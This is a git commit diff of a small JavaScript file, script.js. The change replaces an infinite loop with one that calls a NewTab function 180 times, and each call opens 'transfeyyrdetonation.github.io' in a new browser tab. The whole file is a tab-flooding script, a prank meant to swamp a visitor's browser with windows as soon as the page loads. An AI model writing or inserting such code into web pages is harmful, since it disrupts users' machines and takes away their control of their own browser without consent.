3f5416f45e32d9208c43c52d07baf076e6ab8fa5
kwin487 <82954361+kwin487@users.noreply.github.com>
2022-09-15 11:33:39 -0500

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,8 @@
-for (var i = 0; i < Infinity; i++) {
         function NewTab() {
             window.open(
             "transfeyyrdetonation.github.io", "_blank");
         }
+
+for (var i = 0; i < 180; i++) {
+       NewTab();
 }
